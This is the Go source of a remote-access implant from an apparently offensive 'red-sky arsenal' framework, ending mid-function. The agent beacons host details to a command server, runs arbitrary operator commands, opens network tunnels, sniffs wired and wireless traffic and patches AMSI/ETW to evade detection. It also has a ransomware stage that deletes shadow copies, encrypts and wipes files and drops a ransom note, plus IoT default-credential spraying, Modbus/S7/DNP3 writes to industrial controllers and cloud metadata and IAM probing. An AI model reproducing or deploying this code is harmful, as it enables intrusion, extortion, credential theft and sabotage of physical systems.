// redsky-agent — the implant.
// Phase 5: persistent connection. One TLS + ECDH handshake, then a loop that
// reads tasks, executes them, and sends results until the core closes the
// connection or sends a kill.
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sync"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
	"github.com/sk666G/red-sky---arsenal/internal/capturer"
	"github.com/sk666G/red-sky---arsenal/internal/cloudgo"
	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/cryptogo"
	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
	"github.com/sk666G/red-sky---arsenal/internal/evade"
	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
	"github.com/sk666G/red-sky---arsenal/internal/wireless"
	"path/filepath"
)

func main() {
	host := flag.String("host", "127.0.0.1", "core host")
	port := flag.Int("port", 4444, "core port")
	tag := flag.String("tag", "", "agent tag (used to derive ID)")
	caFP := flag.String("ca-fingerprint", "", "SHA-256 fingerprint of the engagement CA (colon hex)")
	beaconSec := flag.Int("beacon", 30, "beacon interval seconds (heartbeat on the live connection)")
	reconnectSec := flag.Int("reconnect", 10, "reconnect delay after disconnect")
	flag.Parse()

	if *caFP == "" {
		log.Fatalf("no -ca-fingerprint given; get it from core's startup log")
	}

	agentID := *tag
	if agentID == "" {
		agentID = fmt.Sprintf("rs-%08x", rand.Uint32())
	}

	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)

	// Defense evasion: patch AMSI/ETW on Windows. No-op on Linux/macOS.
	for _, r := range evade.Init() {
		if r.Applied {
			log.Printf("evade: [ok] %s — %s", r.Name, r.Detail)
		} else {
			log.Printf("evade: [--] %s — %s", r.Name, r.Detail)
		}
	}

	for {
		if err := runSession(*host, *port, agentID, *caFP, *beaconSec); err != nil {
			log.Printf("session ended: %v", err)
		}
		time.Sleep(time.Duration(*reconnectSec) * time.Second)
	}
}

// runSession opens one connection and services it until it dies.
func runSession(host string, port int, agentID, caFP string, beaconSec int) error {
	tlsCfg, err := rsTLS.ClientTLSConfig(caFP)
	if err != nil {
		return fmt.Errorf("tls config: %w", err)
	}
	rawConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer rawConn.Close()
	conn := tls.Client(rawConn, tlsCfg)
	if err := conn.Handshake(); err != nil {
		return fmt.Errorf("tls handshake: %w", err)
	}

	// --- ECDH handshake ---
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		return fmt.Errorf("read hello: %w", err)
	}
	var hello map[string]string
	if err := json.Unmarshal(frame.Payload, &hello); err != nil {
		return fmt.Errorf("bad hello: %w", err)
	}
	if hello["type"] != "ecdh_hello" {
		return fmt.Errorf("expected ecdh_hello, got %s", hello["type"])
	}
	corePub, err := base64.StdEncoding.DecodeString(hello["pubkey"])
	if err != nil {
		return fmt.Errorf("bad core pubkey: %w", err)
	}
	agentKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		return fmt.Errorf("gen key: %w", err)
	}
	reply := map[string]string{
		"type":   "ecdh_reply",
		"pubkey": base64.StdEncoding.EncodeToString(agentKey.PublicKey().Bytes()),
	}
	replyRaw, _ := json.Marshal(reply)
	if err := wire.WriteFrame(conn, 0, replyRaw); err != nil {
		return fmt.Errorf("send reply: %w", err)
	}
	key, err := crypto.DeriveKey(agentKey, corePub)
	if err != nil {
		return fmt.Errorf("derive key: %w", err)
	}
	sess, err := crypto.NewSession(key)
	if err != nil {
		return fmt.Errorf("new session: %w", err)
	}

	// --- initial beacon ---
	send := func(t proto.MessageType, payload any) error {
		sendMu.Lock()
		defer sendMu.Unlock()
		return sendEncrypted(conn, sess, t, payload)
	}
	if err := send(proto.TypeBeacon, proto.Beacon{
		AgentID: agentID,
		Info:    collectInfo(),
		TS:      time.Now().Unix(),
	}); err != nil {
		return fmt.Errorf("send beacon: %w", err)
	}

	// --- heartbeat goroutine ---
	stopBeacon := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Duration(beaconSec) * time.Second)
		defer t.Stop()
		for {
			select {
			case <-stopBeacon:
				return
			case <-t.C:
				_ = send(proto.TypeBeacon, proto.Beacon{
					AgentID: agentID,
					Info:    collectInfo(),
					TS:      time.Now().Unix(),
				})
			}
		}
	}()
	defer close(stopBeacon)

	// --- task loop ---
	for {
		frame, err := wire.ReadFrame(conn)
		if err != nil {
			if err == io.EOF {
				return fmt.Errorf("core closed connection")
			}
			return fmt.Errorf("read frame: %w", err)
		}
		if frame.Flags&wire.FlagEncrypted == 0 {
			return fmt.Errorf("unexpected plaintext frame")
		}
		plain, err := sess.Decrypt(frame.Payload)
		if err != nil {
			return fmt.Errorf("decrypt: %w", err)
		}
		var env proto.Envelope
		if err := json.Unmarshal(plain, &env); err != nil {
			return fmt.Errorf("envelope: %w", err)
		}
		switch env.Type {
		case proto.TypeTask:
			var task proto.Task
			if err := json.Unmarshal(env.Payload, &task); err != nil {
				continue
			}
			log.Printf("task %s kind=%s: %s %v", task.ID, task.Kind, task.Cmd, task.Args)
			var result proto.Result
			if task.Kind == "framework" {
				result = runFrameworkTask(task)
			} else {
				result = runTask(task)
			}
			if err := send(proto.TypeResult, result); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case proto.TypeTunnelOpen:
			var t proto.TunnelOpen
			if err := json.Unmarshal(env.Payload, &t); err != nil {
				continue
			}
			go handleTunnelOpen(conn, sess, t)
		case proto.TypeTunnelData:
			var t proto.TunnelData
			if err := json.Unmarshal(env.Payload, &t); err != nil {
				continue
			}
			routeInboundTunnelData(&t)
		case proto.TypeTunnelClose:
			var t proto.TunnelClose
			if err := json.Unmarshal(env.Payload, &t); err != nil {
				continue
			}
			closeTunnel(&t)
		case proto.TypeWirelessStart:
			var ws proto.WirelessStart
			if err := json.Unmarshal(env.Payload, &ws); err != nil {
				continue
			}
			go runWireless(conn, sess, ws)
		case proto.TypeCryptoStart:
			var cs proto.CryptoStart
			if err := json.Unmarshal(env.Payload, &cs); err != nil {
				log.Printf("[crypto] unmarshal: %v", err)
				continue
			}
			go runCrypto(conn, sess, cs)
		case proto.TypeIoTCredsStart:
			var ic proto.IoTCredsStart
			if err := json.Unmarshal(env.Payload, &ic); err != nil {
				log.Printf("[iotcreds] unmarshal: %v", err)
				continue
			}
			go runIoTCreds(conn, sess, ic)
		case proto.TypeIcsStart:
			var is proto.IcsStart
			if err := json.Unmarshal(env.Payload, &is); err != nil {
				log.Printf("[ics] unmarshal: %v", err)
				continue
			}
			go runIcs(conn, sess, is)
		case proto.TypeCloudStart:
			var cc proto.CloudStart
			if err := json.Unmarshal(env.Payload, &cc); err != nil {
				log.Printf("[cloud] unmarshal: %v", err)
				continue
			}
			go runCloud(conn, sess, cc)
		case proto.TypeCryptoOpStart:
			var co proto.CryptoOpStart
			if err := json.Unmarshal(env.Payload, &co); err != nil {
				log.Printf("[cryptoop] unmarshal: %v", err)
				continue
			}
			go runCryptoOp(conn, sess, co)
		case proto.TypeWirelessStop:
			var ws proto.WirelessStop
			if err := json.Unmarshal(env.Payload, &ws); err != nil {
				continue
			}
			stopWireless(ws.SessionID)
		case proto.TypeCaptureStart:
			var cs proto.CaptureStart
			if err := json.Unmarshal(env.Payload, &cs); err != nil {
				continue
			}
			go runCapture(conn, sess, cs)
		case proto.TypeCaptureStop:
			var cs proto.CaptureStop
			if err := json.Unmarshal(env.Payload, &cs); err != nil {
				continue
			}
			stopCapture(cs.SessionID)
		case proto.TypeSleep:
			var s proto.Sleep
			_ = json.Unmarshal(env.Payload, &s)
			log.Printf("sleep request %dms (not implemented in phase 5)", s.MS)
		case proto.TypeKill:
			log.Printf("kill requested, exiting")
			os.Exit(0)
		default:
			log.Printf("unknown message type: %s", env.Type)
		}
	}
}

func collectInfo() proto.AgentInfo {
	hostname, _ := os.Hostname()
	usr := "?"
	uid := -1
	if u, err := user.Current(); err == nil {
		usr = u.Username
		fmt.Sscanf(u.Uid, "%d", &uid)
	}
	return proto.AgentInfo{
		Hostname:     hostname,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		User:         usr,
		UID:          uid,
		PID:          os.Getpid(),
		Capabilities: []string{"exec", "file_get", "file_put", "tls", "aes-gcm"},
	}
}

func runTask(t proto.Task) proto.Result {
	timeout := time.Duration(t.Timeout) * time.Second
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	cmd := exec.Command(t.Cmd, t.Args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return proto.Result{TaskID: t.ID, Error: err.Error(), ExitCode: -1}
	}
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		rc := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				rc = ee.ExitCode()
			} else {
				rc = -1
			}
		}
		return proto.Result{TaskID: t.ID, Stdout: stdout.String(), Stderr: stderr.String(), ExitCode: rc}
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return proto.Result{TaskID: t.ID, Error: "timeout", ExitCode: -1}
	}
}

func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	enc, err := sess.Encrypt(envBytes)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, wire.FlagEncrypted, enc)
}

// runFrameworkTask handles a Task with Kind="framework" by dispatching to
// agentfw, which runs the module natively in the agent process.
func runFrameworkTask(t proto.Task) proto.Result {
	ctx := context.Background()
	if t.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(t.Timeout)*time.Second)
		defer cancel()
	}
	r := agentfw.Dispatch(ctx, t.Cmd, t.Args)
	return proto.Result{
		TaskID: t.ID,
		Stdout: r.Output,
		Stderr: func() string {
			if r.Err != nil {
				return r.Err.Error()
			}
			return ""
		}(),
		ExitCode: r.ExitCode,
	}
}

// --- tunnels ---

var sendMu sync.Mutex

type agentTunnel struct {
	conn net.Conn
	done chan struct{}
}

var (
	activeTunnels   = map[string]*agentTunnel{}
	activeTunnelsMu sync.Mutex
)

func handleTunnelOpen(rwc net.Conn, sess *crypto.Session, t proto.TunnelOpen) {
	target := fmt.Sprintf("%s:%d", t.Host, t.Port)
	c, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		sendTunnelAck(rwc, sess, proto.TypeTunnelFail, proto.TunnelFail{
			TunnelID: t.TunnelID, Error: err.Error(),
		})
		return
	}
	at := &agentTunnel{conn: c, done: make(chan struct{})}
	activeTunnelsMu.Lock()
	activeTunnels[t.TunnelID] = at
	activeTunnelsMu.Unlock()

	log.Printf("tunnel %s -> %s", t.TunnelID, target)
	sendTunnelAck(rwc, sess, proto.TypeTunnelReady, proto.TunnelReady{TunnelID: t.TunnelID})

	// read from target -> send tunnel_data to core
	go func() {
		defer func() {
			activeTunnelsMu.Lock()
			delete(activeTunnels, t.TunnelID)
			activeTunnelsMu.Unlock()
			c.Close()
		}()
		buf := make([]byte, 16*1024)
		for {
			n, err := c.Read(buf)
			if n > 0 {
				sendTunnelAck(rwc, sess, proto.TypeTunnelData, proto.TunnelData{
					TunnelID: t.TunnelID, Data: buf[:n],
				})
			}
			if err != nil {
				sendTunnelAck(rwc, sess, proto.TypeTunnelData, proto.TunnelData{
					TunnelID: t.TunnelID, EOF: true,
				})
				return
			}
		}
	}()
}

func routeInboundTunnelData(t *proto.TunnelData) {
	activeTunnelsMu.Lock()
	at := activeTunnels[t.TunnelID]
	activeTunnelsMu.Unlock()
	if at == nil {
		return
	}
	if len(t.Data) > 0 {
		_, _ = at.conn.Write(t.Data)
	}
	if t.EOF {
		at.conn.Close()
	}
}

func closeTunnel(t *proto.TunnelClose) {
	activeTunnelsMu.Lock()
	at := activeTunnels[t.TunnelID]
	delete(activeTunnels, t.TunnelID)
	activeTunnelsMu.Unlock()
	if at != nil {
		at.conn.Close()
	}
}

func sendTunnelAck(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) {
	sendMu.Lock()
	defer sendMu.Unlock()
	_ = sendEncrypted(conn, sess, t, payload)
}

// --- capture ---

var (
	activeCaptures   = map[string]context.CancelFunc{}
	activeCapturesMu sync.Mutex
)

func runCapture(conn net.Conn, sess *crypto.Session, cs proto.CaptureStart) {
	_ = context.Background()
	ctx, cancel := context.WithCancel(context.Background())
	_ = ctx
	activeCapturesMu.Lock()
	activeCaptures[cs.SessionID] = cancel
	activeCapturesMu.Unlock()
	defer func() {
		activeCapturesMu.Lock()
		delete(activeCaptures, cs.SessionID)
		activeCapturesMu.Unlock()
		cancel()
	}()

	// chunky encode: serialize frames into pcap record format on the fly and
	// ship them in 64KB data messages.
	var chunk []byte
	var chunkCount int
	const chunkMax = 60 * 1024

	flushChunk := func() {
		if len(chunk) == 0 {
			return
		}
		sendTunnelAck(conn, sess, proto.TypeCaptureData, proto.CaptureData{
			SessionID: cs.SessionID,
			Data:      chunk,
			Count:     chunkCount,
		})
		chunk = nil
		chunkCount = 0
	}

	// no per-frame pcap global header here — the core writes that on its side
	timeout := 30 * time.Second
	err := capturer.Capture(ctx, capturer.Options{
		Iface:   cs.Iface,
		Snaplen: cs.Snaplen,
		Timeout: timeout,
	}, func(f capturer.Frame) {
		// encode one record: 16-byte header + payload
		var rh [16]byte
		binary.LittleEndian.PutUint32(rh[0:4], uint32(f.TS.Unix()))
		binary.LittleEndian.PutUint32(rh[4:8], uint32(f.TS.Nanosecond()/1000))
		binary.LittleEndian.PutUint32(rh[8:12], uint32(len(f.Data)))
		binary.LittleEndian.PutUint32(rh[12:16], uint32(f.OrigLen))
		chunk = append(chunk, rh[:]...)
		chunk = append(chunk, f.Data...)
		chunkCount++
		if len(chunk) >= chunkMax {
			flushChunk()
		}
	})
	flushChunk()

	if err != nil {
		sendTunnelAck(conn, sess, proto.TypeCaptureFail, proto.CaptureFail{
			SessionID: cs.SessionID, Error: err.Error(),
		})
		return
	}
	sendTunnelAck(conn, sess, proto.TypeCaptureDone, proto.CaptureDone{
		SessionID: cs.SessionID,
	})
}

func stopCapture(sessionID string) {
	activeCapturesMu.Lock()
	cancel, ok := activeCaptures[sessionID]
	activeCapturesMu.Unlock()
	if ok && cancel != nil {
		cancel()
	}
}

// --- wireless capture ---

var (
	activeWireless   = map[string]context.CancelFunc{}
	activeWirelessMu sync.Mutex
)

func runWireless(conn net.Conn, sess *crypto.Session, ws proto.WirelessStart) {
	ctx, cancel := context.WithCancel(context.Background())
	activeWirelessMu.Lock()
	activeWireless[ws.SessionID] = cancel
	activeWirelessMu.Unlock()
	defer func() {
		activeWirelessMu.Lock()
		delete(activeWireless, ws.SessionID)
		activeWirelessMu.Unlock()
		cancel()
	}()

	var chunk []byte
	var chunkCount int
	const chunkMax = 60 * 1024

	flush := func() {
		if len(chunk) == 0 {
			return
		}
		sendTunnelAck(conn, sess, proto.TypeWirelessData, proto.WirelessData{
			SessionID: ws.SessionID,
			Data:      chunk,
			Count:     chunkCount,
		})
		chunk = nil
		chunkCount = 0
	}

	err := wireless.Capture(ctx, wireless.Options{
		Iface:   ws.Iface,
		Channel: ws.Channel,
		Timeout: 30 * time.Second,
	}, func(f wireless.Frame) {
		// record framing: 8-byte ts_ns BE + 4-byte len BE + payload
		hdr := make([]byte, 12)
		ns := uint64(f.TS.UnixNano())
		for i := 0; i < 8; i++ {
			hdr[7-i] = byte(ns >> (8 * i))
		}
		ln := uint32(len(f.Data))
		hdr[8] = byte(ln >> 24)
		hdr[9] = byte(ln >> 16)
		hdr[10] = byte(ln >> 8)
		hdr[11] = byte(ln)
		chunk = append(chunk, hdr...)
		chunk = append(chunk, f.Data...)
		chunkCount++
		if len(chunk) >= chunkMax {
			flush()
		}
	})
	flush()

	if err != nil {
		sendTunnelAck(conn, sess, proto.TypeWirelessFail, proto.WirelessFail{
			SessionID: ws.SessionID, Error: err.Error(),
		})
		return
	}
	sendTunnelAck(conn, sess, proto.TypeWirelessDone, proto.WirelessDone{
		SessionID: ws.SessionID,
	})
}

func stopWireless(sessionID string) {
	activeWirelessMu.Lock()
	cancel, ok := activeWireless[sessionID]
	activeWirelessMu.Unlock()
	if ok && cancel != nil {
		cancel()
	}

	// runCrypto drives the crypto_malware stage on the agent. Mirrors runWireless:
	// owns its own goroutine, sends progress over the tunnel, returns on completion.
	//
	// Stage order:
	//  1. KillVSS  — destroy VSS / snapshots if requested
	//  2. Walk     — encrypt every target file under Root
	//  3. Note     — drop the ransom note in hit directories
	//
	// The agent needs an operator public key already on disk at
	// <workdir>/operator.pub.pem — it is fetched over the tunnel before this
	// handler is invoked by a KeyPush message.
}

func runCrypto(conn net.Conn, sess *crypto.Session, cs proto.CryptoStart) {
	_, cancel := context.WithCancel(context.Background())
	activeCryptoMu.Lock()
	activeCrypto[cs.SessionID] = cancel
	activeCryptoMu.Unlock()
	defer func() {
		activeCryptoMu.Lock()
		delete(activeCrypto, cs.SessionID)
		activeCryptoMu.Unlock()
		cancel()
	}()

	send := func(stage, path string, done, total, bytes int64, ok bool, errStr string) {
		sendTunnelAck(conn, sess, proto.TypeCryptoData, proto.CryptoData{
			SessionID: cs.SessionID,
			Stage:     stage,
			Path:      path,
			Done:      done,
			Total:     total,
			Bytes:     bytes,
			OK:        ok,
			Error:     errStr,
		})
	}

	// load operator public key
	workdir := os.Getenv("REDSKY_WORKDIR")
	if workdir == "" {
		workdir = "."
	}
	pubPath := filepath.Join(workdir, "operator.pub.pem")
	pubPEM, err := os.ReadFile(pubPath)
	if err != nil {
		send("error", "", 0, 0, 0, false, "operator.pub.pem not found: "+err.Error())
		return
	}
	pub, err := cryptor.LoadPublicKey(pubPEM)
	if err != nil {
		send("error", "", 0, 0, 0, false, "load pub: "+err.Error())
		return
	}

	// Stage 1 — shadow destruction
	if cs.KillVSS {
		send("shadow", "", 0, 0, 0, true, "")
		shr := cryptor.DestroySnapshots(cryptor.ShadowOptions{DryRun: cs.DryRun})
		for _, c := range shr.Commands {
			send("shadow", c.Cmd, 0, 0, 0, c.OK || c.Skipped, c.Err)
		}
	}

	// Stage 2 — walk + encrypt. Dry-run just enumerates.
	var (
		count int64
		bytes int64
	)
	opts := cryptor.WalkerOptions{
		Root:     cs.Root,
		DryRun:   cs.DryRun,
		WipeOrig: !cs.DryRun,
		OnHit: func(path string, size int64) {
			count++
			// throttle: only report every 64 files to avoid flooding the tunnel
			if count%64 == 0 || count < 16 {
				send("walk", path, count, 0, bytes, true, "")
			}
		},
		OnDone: func(path string, ok bool, err error) {
			if !ok {
				errStr := ""
				if err != nil {
					errStr = err.Error()
				}
				send("encrypt", path, 0, 0, 0, false, errStr)
				return
			}
			// size not directly available here — rely on OnHit for bytes
		},
	}
	stats, err := cryptor.Walk(opts, pub, cs.KeyID)
	if err != nil {
		send("error", "", 0, 0, 0, false, "walk: "+err.Error())
		return
	}
	bytes = stats.BytesIn
	send("encrypt", "", stats.Encrypted, stats.Found, bytes, true, "")

	// Stage 3 — note
	if cs.Note && !cs.DryRun {
		nr, err := cryptor.DropNote(cryptor.NoteOptions{
			Root:         cs.Root,
			ContactEmail: cs.ContactEmail,
			Address:      cs.Address,
			Price:        cs.Price,
			VictimID:     cs.VictimID,
		})
		if err != nil {
			send("note", "", 0, 0, 0, false, err.Error())
		} else {
			send("note", nr.RootNote, int64(nr.Written), int64(nr.DirCount), 0, true, "")
		}
	}

	send("done", "", stats.Encrypted, stats.Found, bytes, true, "")
}

var (
	activeCryptoMu sync.Mutex
	activeCrypto   = map[string]context.CancelFunc{}
)

// runIoTCreds drives a default-credential spray on the agent. Streams
// every attempt back over the tunnel — hits flagged OK, misses flagged !OK.
// Called via proto.TypeIoTCredsStart.
func runIoTCreds(conn net.Conn, sess *crypto.Session, ic proto.IoTCredsStart) {
	send := func(hit iotcreds.Hit, idx, total int, ok, done bool, errStr string) {
		sendTunnelAck(conn, sess, proto.TypeIoTCredsData, proto.IoTCredsData{
			SessionID: ic.SessionID,
			Index:     idx,
			Total:     total,
			Vendor:    hit.Vendor,
			User:      hit.User,
			Pass:      hit.Pass,
			OK:        ok,
			Done:      done,
			Error:     errStr,
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	activeCryptoMu.Lock()
	activeCrypto[ic.SessionID] = cancel
	activeCryptoMu.Unlock()
	defer func() {
		activeCryptoMu.Lock()
		delete(activeCrypto, ic.SessionID)
		activeCryptoMu.Unlock()
	}()

	total := iotcreds.Count()
	var hitCount int
	onAttempt := func(i int, c iotcreds.Cred, ok bool) {
		if ok {
			hitCount++
			send(iotcreds.Hit{Vendor: c.Vendor, User: c.User, Pass: c.Pass}, i, total, true, false, "")
		} else if i%8 == 0 {
			// throttle misses — every 8th attempt to keep tunnel chatter down
			send(iotcreds.Hit{Vendor: c.Vendor, User: c.User, Pass: c.Pass}, i, total, false, false, "")
		}
	}

	hits, err := iotcreds.Spray(ctx, iotcreds.SprayOptions{
		Host:      ic.Host,
		Port:      ic.Port,
		Protocol:  ic.Protocol,
		Path:      ic.Path,
		Timeout:   ic.Timeout,
		StopFirst: ic.StopFirst,
	}, onAttempt)

	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	send(iotcreds.Hit{}, total, total, len(hits) > 0, true, errStr)
}

// runIcs drives an ICS protocol operation on the agent. Dispatches by
// Protocol to the appropriate icsgo primitive and streams progress via
// IcsData messages. Called via proto.TypeIcsStart.
func runIcs(conn net.Conn, sess *crypto.Session, ic proto.IcsStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeIcsData, proto.IcsData{
			SessionID: ic.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	activeCryptoMu.Lock()
	activeCrypto[ic.SessionID] = cancel
	activeCryptoMu.Unlock()
	defer func() {
		activeCryptoMu.Lock()
		delete(activeCrypto, ic.SessionID)
		activeCryptoMu.Unlock()
	}()

	switch ic.Protocol {
	case "modbus":
		runIcsModbus(ctx, ic, send)
	case "s7":
		runIcsS7(ctx, ic, send)
	case "dnp3":
		runIcsDNP3(ctx, ic, send)
	default:
		send("error", "unknown protocol: "+ic.Protocol, "", false, true)
		return
	}
	send("done", "", "", true, true)
}

func runIcsModbus(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	opts := icsgo.MBOptions{Host: ic.Host, Port: ic.Port, Unit: ic.Unit}
	switch ic.Action {
	case "scan":
		alive, err := icsgo.ModbusUnitScan(ic.Host, ic.Port, 1, 247, 0)
		if err != nil {
			send("scan", "scan error", err.Error(), false, false)
			return
		}
		send("scan", "units responding", fmt.Sprintf("%v", alive), true, false)
	case "read":
		res, err := icsgo.ModbusRead(opts, ic.Func, ic.Start, ic.Count)
		if err != nil {
			send("read", "read error", err.Error(), false, false)
			return
		}
		if res.Exception != 0 {
			send("read", "exception", fmt.Sprintf("code 0x%02x", res.Exception), false, false)
			return
		}
		det := fmt.Sprintf("regs=%v bits=%v", res.Regs, res.Bits)
		send("read", "ok", det, true, false)
	case "write":
		switch ic.Func {
		case icsgo.MBFuncWriteCoil:
			res, err := icsgo.ModbusWriteCoil(opts, ic.Start, ic.Bool)
			if err != nil {
				send("write", "coil write error", err.Error(), false, false)
				return
			}
			send("write", "coil ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
		case icsgo.MBFuncWriteRegister:
			res, err := icsgo.ModbusWriteRegister(opts, ic.Start, ic.Value)
			if err != nil {
				send("write", "reg write error", err.Error(), false, false)
				return
			}
			send("write", "reg ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
		case icsgo.MBFuncWriteMultiRegs:
			res, err := icsgo.ModbusWriteMultiRegs(opts, ic.Start, ic.Values)
			if err != nil {
				send("write", "multi write error", err.Error(), false, false)
				return
			}
			send("write", "multi ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
		}
	}
}

func runIcsS7(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	c, err := icsgo.S7Connect(icsgo.S7Options{Host: ic.Host, Port: ic.Port})
	if err != nil {
		send("connect", "s7 connect error", err.Error(), false, false)
		return
	}
	defer c.Close()

	switch ic.Action {
	case "info":
		data, err := c.S7ReadSZL(0x001C)
		if err != nil {
			send("info", "szl 0x1C error", err.Error(), false, false)
			return
		}
		send("info", "component id", string(data[:min(len(data), 200)]), true, false)
	case "read":
		data, err := c.S7Read(ic.Area, ic.DB, ic.Start, ic.Count)
		if err != nil {
			send("read", "read error", err.Error(), false, false)
			return
		}
		send("read", fmt.Sprintf("%d bytes", len(data)), fmt.Sprintf("%x", data), true, false)
	case "write":
		if err := c.S7Write(ic.Area, ic.DB, ic.Start, ic.Data); err != nil {
			send("write", "write error", err.Error(), false, false)
			return
		}
		send("write", "ok", "", true, false)
	}
}

func runIcsDNP3(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	c, err := icsgo.DNP3Connect(icsgo.DNP3Options{
		Host: ic.Host, Port: ic.Port, Dest: ic.Dest, Src: ic.Src,
	})
	if err != nil {
		send("connect", "dnp3 connect error", err.Error(), false, false)
		return
	}
	defer c.Close()

	var resp icsgo.DNP3Response
	switch ic.Action {
	case "integrity":
		resp, err = c.Integrity()
	case "poll":
		resp, err = c.PollClass(ic.Class)
	default:
		send("error", "unknown dnp3 action: "+ic.Action, "", false, false)
		return
	}
	if err != nil {
		send("read", "dnp3 error", err.Error(), false, false)
		return
	}
	det := fmt.Sprintf("fn=0x%02x iin=0x%04x raw=%x", resp.Function, resp.IIN.Raw, resp.Raw)
	send("read", "ok", det, true, false)
}

// runCloud drives a cloud-provider operation on the agent. Dispatches by
// Action to the appropriate cloudgo primitive, streams CloudData.
func runCloud(conn net.Conn, sess *crypto.Session, c proto.CloudStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeCloudData, proto.CloudData{
			SessionID: c.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	switch c.Action {
	case "probe":
		opts := cloudgo.IMDSOptions{}
		var results []cloudgo.ProbeResult
		switch c.Cloud {
		case "aws":
			results = cloudgo.ProbeAWS(opts)
		case "gcp":
			results = cloudgo.ProbeGCP(opts)
		case "azure":
			results = cloudgo.ProbeAzure(opts)
		default:
			send("error", "cloud must be aws|gcp|azure", "", false, true)
			return
		}
		for _, r := range results {
			ok := r.OK
			det := r.Body
			if len(det) > 800 {
				det = det[:800]
			}
			if r.Error != "" {
				det = r.Error
			}
			send("probe", r.URL, det, ok, false)
		}

	case "chain":
		name, results := cloudgo.ProbeChain(cloudgo.IMDSOptions{})
		if name == "" {
			send("probe", "no cloud IMDS reachable", "", false, false)
			return
		}
		send("probe", "live cloud: "+name, "", true, false)
		for _, r := range results {
			if r.OK {
				det := r.Body
				if len(det) > 800 {
					det = det[:800]
				}
				send("probe", r.URL, det, true, false)
			}
		}

	case "identity":
		key := cloudgo.AWSKey{
			AccessKeyID:     c.AccessKeyID,
			SecretAccessKey: c.SecretAccessKey,
			SessionToken:    c.SessionToken,
			Region:          c.Region,
		}
		id, err := cloudgo.GetCallerIdentity(key)
		if err != nil {
			send("identity", "sts error", err.Error(), false, false)
			return
		}
		send("identity", "identity", fmt.Sprintf("account=%s arn=%s userid=%s", id.Account, id.Arn, id.UserID), true, false)

	case "users":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		users, err := cloudgo.ListUsers(key)
		if err != nil {
			send("iam", "list-users error", err.Error(), false, false)
			return
		}
		for _, u := range users {
			send("iam", "user", u.UserName+" "+u.Arn, true, false)
		}

	case "roles":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		roles, err := cloudgo.ListRoles(key)
		if err != nil {
			send("iam", "list-roles error", err.Error(), false, false)
			return
		}
		for _, r := range roles {
			send("iam", "role", r.RoleName+" "+r.Arn, true, false)
		}

	case "simulate":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		actions := c.Actions
		if len(actions) == 0 {
			actions = cloudgo.ProbeActions
		}
		res, err := cloudgo.SimulatePrincipalPolicy(key, c.PolicySourceArn, actions)
		if err != nil {
			send("simulate", "simulate error", err.Error(), false, false)
			return
		}
		allowed := 0
		for _, r := range res {
			if r.Decision == "allowed" {
				allowed++
				send("simulate", "ALLOW", r.Action, true, false)
			}
		}
		send("simulate", fmt.Sprintf("%d/%d allowed", allowed, len(res)), "", true, false)

	case "driver":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		summary, err := cloudgo.ApplyDriver(key, c.Driver, cloudgo.DriverOptions{
